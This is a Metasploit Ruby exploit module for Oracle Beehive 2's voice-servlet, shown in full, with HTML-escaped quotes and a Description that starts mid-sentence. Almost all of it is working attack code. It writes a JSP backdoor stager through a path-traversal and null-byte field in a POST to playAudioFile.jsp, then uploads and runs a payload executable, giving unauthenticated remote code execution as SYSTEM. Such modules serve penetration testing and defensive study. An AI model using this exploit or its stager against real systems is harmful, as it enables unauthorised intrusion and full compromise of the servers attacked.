# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      &#039;Description&#039;    => %q{
        found in voice-servlet can be abused to write a malicious file onto the target machine, and
        gain remote arbitrary code execution under the context of SYSTEM. Authentication is not
        required to exploit this vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;mr_me <steventhomasseeley[at]gmail.com>&#039;, # Source Incite. Vulnerability discovery, PoC
          &#039;sinn3r&#039;                                  # MSF module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;ZDI&#039;, &#039;15-550&#039;],
          [ &#039;URL&#039;, &#039;http://www.oracle.com/technetwork/topics/security/cpuoct2015-2367953.html&#039; ]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;RPORT&#039;    => 7777
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Oracle Beehive 2&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => "Nov 10 2015",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Oracle Beehive&#039;s base directory", &#039;/&#039;])
      ], self.class)
  end


  def check
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa/&#039;))

    if res.nil?
      vprint_error("Connection timed out.")
      return Exploit::CheckCode::Unknown
    elsif res && (res.code == 403 || res.code == 200)
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Safe
  end


  def exploit
    unless check == Exploit::CheckCode::Detected
      fail_with(Failure::NotVulnerable, &#039;Target does not have voice-servlet&#039;)
    end

    # Init some names
    # We will upload to:
    # C:\oracle\product\2.0.1.0.0\beehive_2\j2ee\BEEAPP\applications\voice-servlet\prompt-qa\
    exe_name = "#{Rex::Text.rand_text_alpha(5)}.exe"
    stager_name = "#{Rex::Text.rand_text_alpha(5)}.jsp"
    print_status("Stager name is: #{stager_name}")
    print_status("Executable name is: #{exe_name}")
    register_files_for_cleanup("../BEEAPP/applications/voice-servlet/voice-servlet/prompt-qa/#{stager_name}")

    # Ok fire!
    print_status("Uploading stager...")
    res = upload_stager(stager_name, exe_name)

    # Hmm if we fail to upload the stager, no point to continue.
    unless res
      fail_with(Failure::Unknown, &#039;Connection timed out.&#039;)
    end

    print_status("Uploading payload...")
    upload_payload(stager_name)
  end

  # Our stager is basically a backdoor that allows us to upload an executable with a POST request.
  def get_jsp_stager(exe_name)
    jsp = %Q|<%@ page import="java.io.*" %>
<%
  ByteArrayOutputStream buf = new ByteArrayOutputStream();
  BufferedReader reader = request.getReader();
  int tmp;
  while ((tmp = reader.read()) != -1) { buf.write(tmp); }
  FileOutputStream fostream = new FileOutputStream("#{exe_name}");
  buf.writeTo(fostream);
  fostream.close();
  Runtime.getRuntime().exec("#{exe_name}");
%>|

    # Since we&#039;re sending it as a GET request, we want to keep it smaller so
    # we gsub stuff we don&#039;t want.
    jsp.gsub!("\n", &#039;&#039;)
    jsp.gsub!(&#039;  &#039;, &#039; &#039;)
    Rex::Text.uri_encode(jsp)
  end


  def upload_stager(stager_name, exe_name)
    # wavfile = Has to be longer than 4 bytes (otherwise you hit a java bug)

    jsp_stager = get_jsp_stager(exe_name)
    uri = normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa&#039;, &#039;playAudioFile.jsp&#039;)
    send_request_cgi({
      &#039;method&#039;        => &#039;POST&#039;,
      &#039;uri&#039;           => uri,
      &#039;encode_params&#039; => false, # Don&#039;t encode %00 for us
      &#039;vars_post&#039;    => {
        &#039;sess&#039;       => "..\\#{stager_name}%00",
        &#039;recxml&#039;     => jsp_stager,
        &#039;audiopath&#039;  => Rex::Text.rand_text_alpha(1),
        &#039;wavfile&#039;    => "#{Rex::Text.rand_text_alpha(5)}.wav",
        &#039;evaluation&#039; => Rex::Text.rand_text_alpha(1)
      }
    })
  end

  def upload_payload(stager_name)
    uri = normalize_uri(target_uri.path, &#039;voice-servlet&#039;, &#039;prompt-qa&#039;, stager_name)
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;data&#039;   => generate_payload_exe(code: payload.encoded)
    })
  end

  def print_status(msg)
    super("#{rhost}:#{rport} - #{msg}")
  end

end

